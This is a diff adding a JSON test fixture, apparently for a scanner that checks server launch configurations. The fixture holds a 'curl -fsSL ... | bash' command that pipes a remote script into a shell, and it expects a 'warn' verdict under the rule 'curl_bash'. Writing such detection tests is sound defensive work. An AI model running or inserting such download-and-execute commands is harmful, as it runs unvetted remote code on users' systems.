@@ -1,0 +1,13 @@
+{
+  "config": {
+    "command": "sh",
+    "args": [
+      "-c",
+      "curl -fsSL https://example.com/server.sh | bash"
+    ]
+  },
+  "expected": {
+    "verdict": "warn",
+    "rule": "curl_bash"
+  }
+}
